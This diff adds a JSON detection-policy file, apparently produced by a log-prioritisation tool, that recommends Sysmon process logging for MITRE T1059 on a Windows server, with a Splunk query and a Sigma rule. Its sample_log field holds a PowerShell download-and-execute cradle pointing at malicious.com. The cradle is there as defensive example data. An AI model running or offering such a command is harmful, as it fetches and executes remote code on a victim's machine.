@@ -1,0 +1,59 @@
+{
+  "policy": {
+    "name": "Politique priorisée pour T1059",
+    "target": {
+      "threat_id": "T1059",
+      "ttp_id": "T1059",
+      "ttp_name": "Command and Scripting Interpreter",
+      "asset_id": "win_srv_ops",
+      "asset_type": "windows_server",
+      "asset_criticality": "high",
+      "exposure": "internal",
+      "business_role": "Serveur Windows supportant des processus opérationnels",
+      "current_log_sources": "Windows Sysmon;Windows Security",
+      "retention_days": "30",
+      "asset_notes": "Actif prioritaire pour exécution de commandes et défense évasive",
+      "strategy": "balanced"
+    },
+    "decision_model": {
+      "name": "Threat-to-Log Value Engine",
+      "principle": "Prioriser les logs selon menace, criticité de l'actif, couverture, coût et bruit.",
+      "priority_levels": [
+        "indispensable",
+        "recommandé",
+        "optionnel"
+      ]
+    },
+    "recommendations": [
+      {
+        "log_source": "Windows Sysmon",
+        "log_type": "process",
+        "priority": "indispensable",
+        "log_value_score": 10.0,
+        "fields": [
+          "CommandLine",
+          "ProcessName",
+          "ParentProcessName"
+        ],
+        "estimated_cost": "moyen",
+        "estimated_noise": "moyen",
+        "detection_coverage": "forte",
+        "reason": "Windows Sysmon est classé indispensable pour T1059 car cette source permet d'observer CommandLine, ProcessName, ParentProcessName sur un actif de type windows_server avec une criticité high.",
+        "blind_spot_if_missing": "Angle mort potentiel : sans Windows Sysmon, l'équipe risque de moins bien détecter les comportements associés à T1059, notamment les signaux portés par CommandLine, ProcessName, ParentProcessName.",
+        "covers": {
+          "ttp_id": "T1059",
+          "ttp_name": "Command and Scripting Interpreter",
+          "tactic": "execution",
+          "cve_id": "",
+          "cve_description": "",
+          "cve_score": "10"
+        },
+        "detection_examples": {
+          "sample_log": "powershell -nop -c \\IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\\",
+          "splunk_query": "index=* sourcetype=sysmon EventCode=1 CommandLine=\\*powershell*\\\" OR CommandLine=\\\"*cmd.exe*\\",
+          "sigma_rule": "title: Detect Command Execution via PowerShell or Cmd\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    CommandLine|contains: ['powershell', 'cmd.exe']\n  condition: selection"
+        }
+      }
+    ]
+  }
+}
